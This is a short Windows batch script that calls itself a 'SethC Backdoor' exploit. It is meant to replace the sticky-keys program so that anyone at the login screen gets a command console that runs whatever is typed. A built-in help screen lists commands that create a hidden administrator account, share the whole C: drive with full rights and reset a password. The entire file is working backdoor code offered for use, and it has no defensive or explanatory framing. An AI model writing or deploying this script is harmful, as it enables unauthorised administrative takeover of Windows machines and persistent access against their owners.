@ECHO OFF
CLS
TITLE Got admin? ^| SethC Backdoor. ^| Enjoy root access.
COLOR 0A
ECHO                    ###############################################
ECHO                    #$SETHC EXPLOIT V1.0 SUCCESS                  #
ECHO                    #$Got Admin?                                  #
ECHO                    #$System rooted.                              #
ECHO                    ###############################################
:console
SET /P RUN=ROOT^$^>
if "%RUN%"=="rooth" goto Givemeroot
if not "%RUN%"=="rooth" goto ExecRoot
goto console

:ExecRoot
%RUN%
goto console

:Givemeroot
ECHO How to get root access:
ECHO * NET user /add useraccountname mypassword
ECHO * NET localgroup administrators useraccountname /add
ECHO * NET share concfg*C:\\/grant:useraccountname,full
ECHO * NET user useraccountname *
ECHO Enjoy it.
goto console